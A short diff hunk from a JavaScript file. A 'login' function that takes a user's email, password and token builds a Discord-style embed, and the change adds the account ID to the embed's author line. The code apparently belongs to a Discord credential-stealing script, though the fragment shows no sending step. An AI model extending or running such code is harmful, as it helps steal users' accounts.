@@ -618,8 +618,8 @@ const login = async (email, password, token) => {
             inline: true,
           },
         ],
-        author: {
-          name: json.username + '#' + json.discriminator,
+         author: {
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
